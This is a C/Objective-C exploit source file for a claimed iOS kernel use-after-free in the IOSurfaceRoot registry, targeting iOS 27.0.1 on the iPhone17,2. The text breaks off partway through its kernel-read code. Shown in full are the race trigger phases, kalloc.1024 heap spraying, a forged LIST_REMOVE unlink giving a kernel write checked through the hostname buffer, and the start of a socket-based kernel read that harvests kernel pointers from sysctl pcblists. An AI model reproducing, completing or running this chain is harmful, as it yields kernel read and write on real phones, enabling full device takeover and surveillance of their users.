// CVE-2026-112477 IOSurface Registry UAF — full exploitation chain
//
// Trigger UAF via re-registration race in IOSurfaceRoot registry.
// Reclaim freed kalloc.1024 slot with controlled data.
// LIST_REMOVE unlink kwrite → DarkSword two-socket kread.
//
// Target: iOS 27.0.1 (24A446) — iPhone17,2 / A17 Pro (no kernel MTE)
//
// Selector contracts (120× consistent):
//   sel17 (register):   MUST be async. referenceCnt≥1, ref≠NULL.
//   sel18 (deregister): MUST be SYNC. scalarIn=0, structIn=24B, no output.

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <pthread.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/sysctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <IOKit/IOKitLib.h>
#ifndef PROC_PIDFDSOCKETINFO
#define PROC_PIDFDSOCKETINFO 3
#endif
#include "iosurface_uaf.h"
#include "IOKitBridge.h"

#ifndef ICMP6_FILTER
#define ICMP6_FILTER 18
#endif

#pragma mark - Logging

static israce_log_fn s_log = NULL;
static uint64_t s_kaslr_slide = 0;

#define islog(...) do { if (s_log) { char _b[1024]; snprintf(_b, sizeof(_b), __VA_ARGS__); s_log(_b); } } while(0)

void israce_set_log(israce_log_fn fn) { s_log = fn; }
void israce_set_kaslr(uint64_t slide) { s_kaslr_slide = slide; }

#pragma mark - Kernel offsets (27.0.1 iPhone17,2)

#define KOFF_SURF_PARENT      0xe8
#define KOFF_SURF_ALIVE       0xf0
#define KOFF_SURF_MUTEX       0x150
#define KOFF_SURF_LIST_NEXT   0x188
#define KOFF_SURF_LIST_PREV   0x190

#define HOSTNAME_UNSLID       0xfffffff00b880b00ULL
#define RIPCB6_HEAD_UNSLID    0xfffffff00b781990ULL
#define KOFF_INPCB_ICMP6FILT  0x148

#define HOSTNAME_SLID         (HOSTNAME_UNSLID + s_kaslr_slide)
#define RIPCB6_SLID           (RIPCB6_HEAD_UNSLID + s_kaslr_slide)

#pragma mark - IOSurface symbols

typedef struct __IOSurface *IOSurfaceRef_;
static IOSurfaceRef_ (*pIOSurfaceCreate)(CFDictionaryRef);
static uint32_t (*pIOSurfaceGetID)(IOSurfaceRef_);
static kern_return_t (*pIOSurfaceLock)(IOSurfaceRef_, uint32_t, uint32_t *);
static kern_return_t (*pIOSurfaceUnlock)(IOSurfaceRef_, uint32_t, uint32_t *);
static IOSurfaceRef_ (*pIOSurfaceLookup)(uint32_t);
static void (*pIOSurfaceSetValue)(IOSurfaceRef_, CFStringRef, CFTypeRef);
static bool s_loaded = false;

static void load_syms(void) {
    if (s_loaded) return;
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) { islog("[israce] dlopen IOSurface FAILED"); return; }
    pIOSurfaceCreate   = dlsym(h, "IOSurfaceCreate");
    pIOSurfaceGetID    = dlsym(h, "IOSurfaceGetID");
    pIOSurfaceLock     = dlsym(h, "IOSurfaceLock");
    pIOSurfaceUnlock   = dlsym(h, "IOSurfaceUnlock");
    pIOSurfaceLookup   = dlsym(h, "IOSurfaceLookup");
    pIOSurfaceSetValue = dlsym(h, "IOSurfaceSetValue");
    s_loaded = true;
    islog("[israce] IOSurface syms: create=%d id=%d lock=%d lookup=%d setValue=%d",
         !!pIOSurfaceCreate, !!pIOSurfaceGetID, !!pIOSurfaceLock,
         !!pIOSurfaceLookup, !!pIOSurfaceSetValue);
}

static IOSurfaceRef_ mk_surface(void) {
    if (!pIOSurfaceCreate) return NULL;
    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *keys[] = {
        CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
    };
    const void *vals[] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, keys, vals, 4,
                                           &kCFTypeDictionaryKeyCallBacks,
                                           &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef_ s = pIOSurfaceCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

#pragma mark - Service + port helpers

static io_service_t find_service(void) {
    const char *names[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", NULL };
    for (int i = 0; names[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(names[i]);
        if (!m) continue;
        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (svc) { islog("[israce] service: %s → 0x%x", names[i], svc); return svc; }
    }
    return 0;
}

static mach_port_t new_wp(void) {
    mach_port_t p = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
    return p;
}

static void drop_wp(mach_port_t p) {
    if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}

#pragma mark - Selector calls

static kern_return_t call_sel17(io_connect_t c, const uint64_t in[3], mach_port_t wp) {
    uint64_t ref = 0x1122334455667788ULL;
    uint32_t soc = 0;
    return IOConnectCallAsyncMethod(c, ISRACE_SEL_REG, wp, &ref, 1,
                                    NULL, 0, (const void *)in, 24,
                                    NULL, &soc, NULL, NULL);
}

static kern_return_t call_sel18(io_connect_t c, const uint64_t in[3]) {
    return IOConnectCallMethod(c, ISRACE_SEL_DEREG,
                               NULL, 0, (const void *)in, 24,
                               NULL, NULL, NULL, NULL);
}

static const char *rc_name(uint32_t rc) {
    switch (rc) {
        case 0:          return "SUCCESS";
        case 0xE00002C2: return "BadArgument";
        case 0xE00002C9: return "InternalError(dup)";
        case 0xE00002D8: return "NotAttached(27.2)";
        case 0xE00002CC: return "NotOpen";
        default:         return "other";
    }
}

#pragma mark - Phase 0: Calibrate

static bool calibrate(io_service_t svc) {
    uint64_t in[3] = { 1, 2, 3 };
    io_connect_t c = 0;
    mach_port_t wp = new_wp();
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
    if (kr != KERN_SUCCESS) { islog("[israce] calibrate: open failed"); drop_wp(wp); return false; }

    uint32_t rc17 = (uint32_t)call_sel17(c, in, wp);
    islog("[israce] calibrate: sel17(async) → 0x%x %s", rc17, rc_name(rc17));

    if (rc17 == 0) {
        uint32_t rc17b = (uint32_t)call_sel17(c, in, wp);
        islog("[israce] calibrate: sel17(dup) → 0x%x %s", rc17b, rc_name(rc17b));

        uint32_t rc18 = (uint32_t)call_sel18(c, in);
        islog("[israce] calibrate: sel18(SYNC) → 0x%x %s", rc18, rc_name(rc18));

        uint32_t rc17c = (uint32_t)call_sel17(c, in, wp);
        islog("[israce] calibrate: sel17(re-reg) → 0x%x %s", rc17c, rc_name(rc17c));

        if (rc17c == 0xE00002D8) {
            islog("[israce] DEVICE PATCHED (27.2+) — +0xf1 blocks re-registration");
            IOServiceClose(c); drop_wp(wp);
            return false;
        }
        if (rc17c == 0) {
            islog("[israce] ★ RE-REGISTRATION WORKS — 27.0.1 vulnerable");
        }
    }

    IOServiceClose(c);
    drop_wp(wp);
    return (rc17 == 0);
}

#pragma mark - Phase 1: V_TEARREG

typedef struct {
    io_service_t svc;
    volatile int run;
    volatile uint64_t reg_count;
    volatile uint64_t reg_success;
} tearreg_ctx_t;

static void *tearreg_spam_thread(void *arg) {
    tearreg_ctx_t *ctx = (tearreg_ctx_t *)arg;
    uint64_t in[3] = { 1, 2, 3 };
    while (ctx->run) {
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(ctx->svc, mach_task_self(), 0, &c);
        if (kr != KERN_SUCCESS) continue;
        mach_port_t wp = new_wp();
        kern_return_t r = call_sel17(c, in, wp);
        __sync_fetch_and_add(&ctx->reg_count, 1);
        if (r == 0) __sync_fetch_and_add(&ctx->reg_success, 1);
        IOServiceClose(c);
        drop_wp(wp);
    }
    return NULL;
}

static void try_tearreg(io_service_t svc, uint32_t iterations, israce_result_t *result) {
    islog("[israce] === V_TEARREG: %u iterations, 8 threads ===", iterations);

    tearreg_ctx_t ctx = { .svc = svc, .run = 1, .reg_count = 0, .reg_success = 0 };
    pthread_t threads[8];
    for (int i = 0; i < 8; i++)
        pthread_create(&threads[i], NULL, tearreg_spam_thread, &ctx);

    for (uint32_t iter = 0; iter < iterations; iter++) {
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
        if (kr != KERN_SUCCESS) continue;
        mach_port_t wp = new_wp();
        uint64_t in[3] = { 1, 2, 3 };
        call_sel17(c, in, wp);
        usleep(50 + (iter % 20) * 10);
        IOServiceClose(c);
        drop_wp(wp);

        if (iter % 50 == 49) {
            islog("[israce] V_TEARREG: %u/%u — reg=%llu ok=%llu",
                 iter + 1, iterations,
                 (unsigned long long)ctx.reg_count,
                 (unsigned long long)ctx.reg_success);
        }
    }

    ctx.run = 0;
    for (int i = 0; i < 8; i++)
        pthread_join(threads[i], NULL);

    islog("[israce] V_TEARREG: done — reg=%llu ok=%llu",
         (unsigned long long)ctx.reg_count, (unsigned long long)ctx.reg_success);
}

#pragma mark - Phase 2: V_LOCKDEG

typedef struct {
    IOSurfaceRef_ surf;
    volatile int run;
} lockdeg_ctx_t;

static void *lockdeg_spam_thread(void *arg) {
    lockdeg_ctx_t *ctx = (lockdeg_ctx_t *)arg;
    uint32_t seed = 0;
    while (ctx->run) {
        if (pIOSurfaceLock) pIOSurfaceLock(ctx->surf, 0, &seed);
        if (pIOSurfaceUnlock) pIOSurfaceUnlock(ctx->surf, 0, &seed);
    }
    return NULL;
}

static void try_lockdeg(io_service_t svc, uint32_t iterations, israce_result_t *result) {
    islog("[israce] === V_LOCKDEG: %u iterations ===", iterations);

    for (uint32_t iter = 0; iter < iterations; iter++) {
        mach_port_t wp = new_wp();
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
        if (kr != KERN_SUCCESS) { drop_wp(wp); continue; }

        uint64_t in[3] = { 1, 2, 3 };
        call_sel17(c, in, wp);

        IOSurfaceRef_ s = mk_surface();
        lockdeg_ctx_t lctx = { .surf = s, .run = 1 };
        pthread_t lthreads[4];
        for (int t = 0; t < 4; t++)
            pthread_create(&lthreads[t], NULL, lockdeg_spam_thread, &lctx);

        usleep(200 + (iter % 40) * 25);
        IOServiceClose(c);

        usleep(300);
        lctx.run = 0;
        for (int t = 0; t < 4; t++)
            pthread_join(lthreads[t], NULL);

        if (s) CFRelease((CFTypeRef)s);
        drop_wp(wp);

        if (iter % 50 == 49) {
            islog("[israce] V_LOCKDEG: %u/%u", iter + 1, iterations);
        }
    }
    islog("[israce] V_LOCKDEG: done — survived %u iters", iterations);
}

#pragma mark - Phase 3: REREG+DUALREF

static void try_rereg_dualref(io_service_t svc, uint32_t iterations, israce_result_t *result) {
    islog("[israce] === REREG+DUALREF: %u iterations ===", iterations);
    uint32_t lookups_ok = 0, lookups_fail = 0;

    for (uint32_t iter = 0; iter < iterations; iter++) {
        io_connect_t c = 0;
        mach_port_t wp = new_wp();
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
        if (kr != KERN_SUCCESS) { drop_wp(wp); continue; }

        uint64_t in[3] = { 1, 2, 3 };
        call_sel17(c, in, wp);

        IOSurfaceRef_ s = mk_surface();
        uint32_t gid = 0;
        IOSurfaceRef_ s2 = NULL;
        if (s && pIOSurfaceGetID && pIOSurfaceLookup) {
            gid = pIOSurfaceGetID(s);
            s2 = pIOSurfaceLookup(gid);
            if (s2) lookups_ok++; else lookups_fail++;
        }

        call_sel18(c, in);
        uint32_t rc_rereg = (uint32_t)call_sel17(c, in, wp);

        lockdeg_ctx_t lctx = { .surf = s, .run = 1 };
        pthread_t lthreads[4];
        if (s) {
            for (int t = 0; t < 4; t++)
                pthread_create(&lthreads[t], NULL, lockdeg_spam_thread, &lctx);
        }

        usleep(200 + (iter % 40) * 25);
        IOServiceClose(c);

        usleep(300);
        lctx.run = 0;
        if (s) {
            for (int t = 0; t < 4; t++)
                pthread_join(lthreads[t], NULL);
        }

        if (s) CFRelease((CFTypeRef)s);
        usleep(200);
        if (s2) CFRelease((CFTypeRef)s2);
        drop_wp(wp);

        if (iter % 50 == 49) {
            islog("[israce] REREG+DUALREF: %u/%u — rereg=0x%x ok=%u fail=%u",
                 iter + 1, iterations, rc_rereg, lookups_ok, lookups_fail);
        }
    }
    islog("[israce] REREG+DUALREF: done — ok=%u fail=%u", lookups_ok, lookups_fail);
}

#pragma mark - Phase 4: COMBINED

typedef struct {
    io_service_t svc;
    volatile int run;
    volatile uint64_t count;
} combined_spam_ctx_t;

static void *combined_spam_thread(void *arg) {
    combined_spam_ctx_t *ctx = (combined_spam_ctx_t *)arg;
    uint64_t in[3] = { 1, 2, 3 };
    while (ctx->run) {
        io_connect_t c = 0;
        if (IOServiceOpen(ctx->svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        mach_port_t wp = new_wp();
        call_sel17(c, in, wp);
        call_sel18(c, in);
        call_sel17(c, in, wp);
        IOServiceClose(c);
        drop_wp(wp);
        __sync_fetch_and_add(&ctx->count, 1);
    }
    return NULL;
}

static void try_combined_tearreg(io_service_t svc, uint32_t iterations, israce_result_t *result) {
    islog("[israce] === COMBINED: %u iters, 8 threads ===", iterations);

    combined_spam_ctx_t ctx = { .svc = svc, .run = 1, .count = 0 };
    pthread_t threads[8];
    for (int i = 0; i < 8; i++)
        pthread_create(&threads[i], NULL, combined_spam_thread, &ctx);

    for (uint32_t iter = 0; iter < iterations; iter++) {
        IOSurfaceRef_ s = mk_surface();
        IOSurfaceRef_ s2 = NULL;
        if (s && pIOSurfaceGetID && pIOSurfaceLookup) {
            uint32_t gid = pIOSurfaceGetID(s);
            s2 = pIOSurfaceLookup(gid);
        }
        usleep(100 + (iter % 30) * 10);
        if (s) CFRelease((CFTypeRef)s);
        if (s2) CFRelease((CFTypeRef)s2);

        if (iter % 100 == 99) {
            islog("[israce] COMBINED: %u/%u — threads=%llu",
                 iter + 1, iterations, (unsigned long long)ctx.count);
        }
    }

    ctx.run = 0;
    for (int i = 0; i < 8; i++)
        pthread_join(threads[i], NULL);

    islog("[israce] COMBINED: done — threads=%llu", (unsigned long long)ctx.count);
}

// ═══════════════════════════════════════════════════════════════════
// NEW: Exploitation layer — kwrite + DarkSword kread
// ═══════════════════════════════════════════════════════════════════

#pragma mark - Global state (kwrite + DarkSword)

static bool s_kwrite_active = false;
static int s_ds_sock_a = -1;
static int s_ds_sock_b = -1;
static uint64_t s_ds_inpcb_a = 0;
static uint64_t s_ds_inpcb_b = 0;
static bool s_ds_active = false;

#pragma mark - Hostname oracle

static bool hostname_read(char *buf, size_t bufsz) {
    size_t len = bufsz;
    return (sysctlbyname("kern.hostname", buf, &len, NULL, 0) == 0);
}

#pragma mark - Spray buffer for LIST_REMOVE kwrite

static void build_kwrite_spray(uint8_t *buf, uint64_t target, uint64_t value) {
    memset(buf, 0, ISRACE_KALLOC_1024_SIZE);

    uint32_t magic = ISRACE_MARKER_MAGIC;
    memcpy(buf + 0, &magic, 4);

    // Parent=NULL: unlink_from_list should check and return early.
    // If it crashes here, switch to HOSTNAME_SLID+256 as fake parent.
    uint64_t zero = 0;
    memcpy(buf + KOFF_SURF_PARENT, &zero, 8);
    buf[KOFF_SURF_ALIVE] = 0;
    memset(buf + KOFF_SURF_MUTEX, 0, 64);

    // LIST_REMOVE semantics:
    //   *le_prev = le_next           → writes `value` to `target`
    //   *(le_next + 8) = le_prev     → side-effect: writes `target` to `value+8`
    //
    // Caller MUST ensure value+8 is writable kernel memory.
    memcpy(buf + KOFF_SURF_LIST_NEXT, &value, 8);
    memcpy(buf + KOFF_SURF_LIST_PREV, &target, 8);
}

#pragma mark - IOSurface property spray into kalloc.1024

static IOSurfaceRef_ s_spray_surfs[ISRACE_RECLAIM_SURFS];
static int s_spray_count = 0;

static void spray_props(const uint8_t *data) {
    s_spray_count = 0;
    if (!pIOSurfaceSetValue) {
        islog("[israce] spray: IOSurfaceSetValue not resolved");
        return;
    }

    CFDataRef cfdata = CFDataCreate(NULL, data, ISRACE_KALLOC_1024_SIZE);
    if (!cfdata) return;

    for (int i = 0; i < ISRACE_RECLAIM_SURFS; i++) {
        IOSurfaceRef_ s = mk_surface();
        if (!s) continue;

        CFStringRef key = CFStringCreateWithFormat(NULL, NULL,
            CFSTR(ISRACE_PROP_KEY_TAG "_%d"), i);
        pIOSurfaceSetValue(s, key, cfdata);
        CFRelease(key);

        s_spray_surfs[s_spray_count++] = s;
    }
    CFRelease(cfdata);
    islog("[israce] spray: %d surfaces × 1024B props", s_spray_count);
}

static void spray_props_cleanup(void) {
    for (int i = 0; i < s_spray_count; i++) {
        if (s_spray_surfs[i]) CFRelease((CFTypeRef)s_spray_surfs[i]);
        s_spray_surfs[i] = NULL;
    }
    s_spray_count = 0;
}

#pragma mark - Spray thread helpers

typedef struct {
    io_service_t svc;
    volatile int go;
    const uint8_t *data;
} spray_thr_ctx_t;

static void *spray_worker(void *arg) {
    spray_thr_ctx_t *ctx = (spray_thr_ctx_t *)arg;
    while (!ctx->go) usleep(1);
    spray_props(ctx->data);
    return NULL;
}

#pragma mark - Zone defrag for kalloc.1024

static void zone_defrag_kalloc1024(void) {
    if (!pIOSurfaceSetValue || !pIOSurfaceCreate) {
        islog("[israce] defrag: IOSurface syms missing");
        return;
    }

    uint8_t fill[ISRACE_KALLOC_1024_SIZE];
    memset(fill, 0x41, sizeof(fill));
    CFDataRef cfdata = CFDataCreate(NULL, fill, ISRACE_KALLOC_1024_SIZE);
    if (!cfdata) return;

    IOSurfaceRef_ surfs[ISRACE_DEFRAG_SURFS];
    int count = 0;
    for (int i = 0; i < ISRACE_DEFRAG_SURFS; i++) {
        surfs[i] = mk_surface();
        if (!surfs[i]) continue;
        CFStringRef key = CFStringCreateWithFormat(NULL, NULL, CFSTR("defrag_%d"), i);
        pIOSurfaceSetValue(surfs[i], key, cfdata);
        CFRelease(key);
        count++;
    }
    CFRelease(cfdata);

    for (int i = 0; i < ISRACE_DEFRAG_SURFS; i++) {
        if (surfs[i]) CFRelease((CFTypeRef)surfs[i]);
    }
    islog("[israce] defrag: %d surfaces allocated+freed in kalloc.1024", count);
}

#pragma mark - Safe reclaim probe buffer

static void build_reclaim_probe(uint8_t *buf, uint32_t attempt_tag) {
    memset(buf, 'K', ISRACE_KALLOC_1024_SIZE);

    uint32_t magic = ISRACE_MARKER_MAGIC;
    memcpy(buf + 0, &magic, 4);
    memcpy(buf + 4, &attempt_tag, 4);

    uint64_t zero = 0;
    memcpy(buf + KOFF_SURF_PARENT, &zero, 8);
    buf[KOFF_SURF_ALIVE] = 0;
    memset(buf + KOFF_SURF_MUTEX, 0, 64);
    memcpy(buf + KOFF_SURF_LIST_NEXT, &zero, 8);
    memcpy(buf + KOFF_SURF_LIST_PREV, &zero, 8);
}

#pragma mark - Reclaim-only trigger (no kwrite target needed)

static int try_reclaim_once(io_service_t svc, const uint8_t *spray_buf) {
    spray_thr_ctx_t sctx = { .svc = svc, .go = 0, .data = spray_buf };
    pthread_t spray_tid;
    pthread_create(&spray_tid, NULL, spray_worker, &sctx);

    combined_spam_ctx_t spam = { .svc = svc, .run = 1, .count = 0 };
    pthread_t spam_tids[8];
    for (int i = 0; i < 8; i++)
        pthread_create(&spam_tids[i], NULL, combined_spam_thread, &spam);

    usleep(1000);
    sctx.go = 1;

    uint64_t in[3] = { 1, 2, 3 };
    for (int i = 0; i < 150; i++) {
        io_connect_t c = 0;
        if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        mach_port_t wp = new_wp();
        call_sel17(c, in, wp);
        call_sel18(c, in);
        call_sel17(c, in, wp);
        usleep(20 + (i & 0xf) * 5);
        IOServiceClose(c);
        drop_wp(wp);
    }

    spam.run = 0;
    for (int i = 0; i < 8; i++)
        pthread_join(spam_tids[i], NULL);
    pthread_join(spray_tid, NULL);

    islog("[israce] reclaim trigger: %d sprayed, %llu spam cycles",
         s_spray_count, (unsigned long long)spam.count);
    return s_spray_count;
}

#pragma mark - Phase 4.5: Reclaim verification

static void phase4_5_reclaim(io_service_t svc, israce_result_t *res) {
    islog("[israce] ═══ Phase 4.5: Reclaim Verification ═══");

    zone_defrag_kalloc1024();
    usleep(5000);

    uint8_t probe_buf[ISRACE_KALLOC_1024_SIZE];
    int best_spray = 0;

    for (uint32_t att = 0; att < ISRACE_RECLAIM_ATTEMPTS; att++) {
        spray_props_cleanup();

        build_reclaim_probe(probe_buf, att + 1);
        int sprayed = try_reclaim_once(svc, probe_buf);

        islog("[israce] reclaim attempt %u/%u: sprayed=%d/%d",
              att + 1, ISRACE_RECLAIM_ATTEMPTS, sprayed, ISRACE_RECLAIM_SURFS);

        if (sprayed > best_spray) best_spray = sprayed;

        if (sprayed >= ISRACE_RECLAIM_SURFS / 2) {
            islog("[israce] ★ reclaim spray OK: %d surfaces → kalloc.1024 saturated", sprayed);
            res->reclaimed = true;
            res->reclaim_spray_count = (uint32_t)sprayed;
            spray_props_cleanup();
            return;
        }

        spray_props_cleanup();
        usleep(5000);
    }

    res->reclaim_spray_count = (uint32_t)best_spray;
    if (best_spray >= 64) {
        res->reclaimed = true;
        islog("[israce] reclaim accepted: best=%d (≥64 threshold)", best_spray);
    } else {
        islog("[israce] ✗ reclaim FAILED: best=%d surfaces (need ≥64)", best_spray);
    }
}

#pragma mark - Phase 5: Trigger + spray + hostname kwrite verification

static void try_kwrite_once(io_service_t svc, const uint8_t *spray_buf) {
    spray_thr_ctx_t sctx = { .svc = svc, .go = 0, .data = spray_buf };
    pthread_t spray_tid;
    pthread_create(&spray_tid, NULL, spray_worker, &sctx);

    combined_spam_ctx_t spam = { .svc = svc, .run = 1, .count = 0 };
    pthread_t spam_tids[8];
    for (int i = 0; i < 8; i++)
        pthread_create(&spam_tids[i], NULL, combined_spam_thread, &spam);

    usleep(2000);
    sctx.go = 1;

    uint64_t in[3] = { 1, 2, 3 };
    for (int i = 0; i < 100; i++) {
        io_connect_t c = 0;
        if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        mach_port_t wp = new_wp();
        call_sel17(c, in, wp);
        call_sel18(c, in);
        call_sel17(c, in, wp);
        usleep(30 + (i & 0xf) * 10);
        IOServiceClose(c);
        drop_wp(wp);
    }

    spam.run = 0;
    for (int i = 0; i < 8; i++)
        pthread_join(spam_tids[i], NULL);
    pthread_join(spray_tid, NULL);
}

static bool phase5_kwrite_verify(io_service_t svc, israce_result_t *res) {
    islog("[israce] ═══ Phase 5: kwrite trigger + hostname verify ═══");

    if (s_kaslr_slide == 0) {
        islog("[israce] WARNING: KASLR slide=0, hostname oracle will use unslid addresses");
    }

    // Safe kwrite: both target and side-effect land in hostname buffer
    // *HOSTNAME = HOSTNAME+16, *(HOSTNAME+24) = HOSTNAME
    uint64_t target = HOSTNAME_SLID;
    uint64_t value  = HOSTNAME_SLID + 16;

    uint8_t spray_buf[ISRACE_KALLOC_1024_SIZE];
    build_kwrite_spray(spray_buf, target, value);

    char hbefore[256] = {0};
    hostname_read(hbefore, sizeof(hbefore));
    islog("[israce] hostname before: '%.32s' (len=%zu)", hbefore, strlen(hbefore));

    for (uint32_t att = 0; att < ISRACE_MAX_ATTEMPTS; att++) {
        islog("[israce] kwrite attempt %u/%u", att + 1, ISRACE_MAX_ATTEMPTS);

        try_kwrite_once(svc, spray_buf);

        char hafter[256] = {0};
        hostname_read(hafter, sizeof(hafter));

        uint64_t first8 = 0;
        memcpy(&first8, hafter, sizeof(first8));

        bool changed = (memcmp(hbefore, hafter, 8) != 0);
        islog("[israce] attempt %u: %s first8=0x%llx",
             att + 1, changed ? "CHANGED" : "same",
             (unsigned long long)first8);

        if (changed && (first8 >> 40) == 0xFFFFFF) {
            islog("[israce] ★★★ kwrite CONFIRMED: hostname contains kptr 0x%llx ★★★",
                 (unsigned long long)first8);
            res->triggered = true;
            res->reclaimed = true;
            res->kwrite_active = true;
            res->kwrite_test_addr = target;
            res->attempts = att + 1;
            s_kwrite_active = true;
            return true;
        }

        spray_props_cleanup();
        usleep(10000);
    }

    islog("[israce] kwrite not confirmed after %u attempts", ISRACE_MAX_ATTEMPTS);
    return false;
}

#pragma mark - DarkSword two-socket kread (ICMPv6 inline)

static int ds_make_sock(void) {
    int s = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (s < 0) {
        islog("[ds] SOCK_RAW failed (%s), trying SOCK_DGRAM", strerror(errno));
        s = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    }
    if (s < 0) {
        islog("[ds] ICMPv6 socket FAILED: %s", strerror(errno));
        return -1;
    }

    uint32_t filt[8];
    memset(filt, 0xFF, sizeof(filt));
    if (setsockopt(s, IPPROTO_ICMPV6, ICMP6_FILTER, filt, sizeof(filt)) < 0) {
        islog("[ds] setsockopt ICMP6_FILTER: %s", strerror(errno));
        close(s);
        return -1;
    }

    islog("[ds] ICMPv6 socket: fd=%d", s);
    return s;
}

static bool ds_is_valid_kptr(uint64_t v) {
    if ((v >> 36) != (0xFFFFFFF0ULL >> 4)) return false;
    if (v == 0xFFFFFFFFFFFFFFFFULL) return false;
    if (v == 0xFFFFFFFF00000000ULL) return false;
    if ((v & 0x00000000FFFFFFFFULL) == 0) return false;
    uint32_t lo12 = (uint32_t)(v & 0xFFF);
    if (lo12 != 0 && lo12 < 0x10) return false;
    return true;
}

static int ds_scan_pcblist_buf(const uint8_t *buf, size_t len,
                               uint64_t *addrs, int max_addrs, int start) {
    int found = start;
    uint32_t hdr_len;
    memcpy(&hdr_len, buf, 4);

    if (hdr_len == 0 || hdr_len > len) {
        for (size_t i = 0; i + 8 <= len && found < max_addrs; i += 4) {
            uint64_t v;
            memcpy(&v, buf + i, 8);
            if (ds_is_valid_kptr(v)) {
                bool dup = false;
                for (int d = 0; d < found; d++) if (addrs[d] == v) { dup = true; break; }
                if (!dup) addrs[found++] = v;
            }
        }
        return found;
    }

    size_t off = hdr_len;
    while (off + 8 < len && found < max_addrs) {
        uint32_t entry_len;
        memcpy(&entry_len, buf + off, 4);
        if (entry_len < 16 || off + entry_len > len) break;
        for (size_t i = 8; i + 8 <= entry_len && found < max_addrs; i += 8) {
            uint64_t v;
            memcpy(&v, buf + off + i, 8);
            if (ds_is_valid_kptr(v)) {
                bool dup = false;
                for (int d = 0; d < found; d++) if (addrs[d] == v) { dup = true; break; }
                if (!dup) {
                    addrs[found++] = v;
                    if (found - start <= 4)
                        islog("[ds]   kptr: 0x%llx (@%zu+%zu)", (unsigned long long)v, off, i);
                }
            }
        }
        off += entry_len;
    }
    return found;
}

static int ds_find_inpcbs(uint64_t *addrs, int max_addrs) {
    struct { const char *sysctl; const char *tag; } paths[] = {
        { "net.inet6.raw6.pcblist_n",  "raw6.n"    },
        { "net.inet6.raw6.pcblist",    "raw6"      },
        { "net.inet.raw.pcblist_n",    "raw.n"     },
        { "net.inet.raw.pcblist",      "raw"       },
        { "net.inet.tcp.pcblist_n",    "tcp.n"     },
        { "net.inet.tcp.pcblist",      "tcp"       },
        { "net.inet.udp.pcblist_n",    "udp.n"     },
        { "net.inet.udp.pcblist",      "udp"       },
        { "net.inet6.tcp6.pcblist",    "tcp6"      },
        { "net.inet6.udp6.pcblist",    "udp6"      },
        { "net.inet6.icmp6.stats",     "icmp6.st"  },
        { "net.local.stream.pcblist",  "local.s"   },
        { "net.local.dgram.pcblist",   "local.d"   },
        { NULL, NULL }
    };

    islog("[ds] ═══ pcblist comprehensive probe ═══");

    int tcp_fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    int udp_fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    islog("[ds] aux: tcp=%d udp=%d icmp6_a=%d icmp6_b=%d",
         tcp_fd, udp_fd, s_ds_sock_a, s_ds_sock_b);

    int total = 0;

    for (int p = 0; paths[p].sysctl; p++) {
        size_t len = 0;
        int rc = sysctlbyname(paths[p].sysctl, NULL, &len, NULL, 0);
        if (rc != 0) {
            islog("[ds] %-10s FAIL errno=%d (%s)", paths[p].tag, errno, strerror(errno));
            continue;
        }
        if (len < 32) {
            islog("[ds] %-10s len=%zu (skip)", paths[p].tag, len);
            continue;
        }

        uint8_t *buf = malloc(len);
        if (!buf) continue;
        size_t rlen = len;
        if (sysctlbyname(paths[p].sysctl, buf, &rlen, NULL, 0) != 0) {
            islog("[ds] %-10s read FAIL errno=%d", paths[p].tag, errno);
            free(buf);
            continue;
        }

        int before = total;
        total = ds_scan_pcblist_buf(buf, rlen, addrs, max_addrs, total);
        int new_kptrs = total - before;

        islog("[ds] %-10s %zu bytes, %d new kptrs (total=%d)", paths[p].tag, rlen, new_kptrs, total);

        if (rlen >= 16) {
            uint64_t first8, second8;
            memcpy(&first8, buf, 8);
            memcpy(&second8, buf + 8, 8);
            islog("[ds]   hdr: 0x%llx 0x%llx", (unsigned long long)first8, (unsigned long long)second8);
        }

        free(buf);
    }

    islog("[ds] ═══ proc_pidinfo socket probe ═══");
    int probe_fds[] = { s_ds_sock_a, s_ds_sock_b, tcp_fd, udp_fd };
    const char *fd_tags[] = { "icmp6a", "icmp6b", "tcp6", "udp6" };
    for (int f = 0; f < 4; f++) {
        if (probe_fds[f] < 0) continue;
        uint8_t info[1024];
        int nb = proc_pidinfo(getpid(), PROC_PIDFDSOCKETINFO, probe_fds[f],
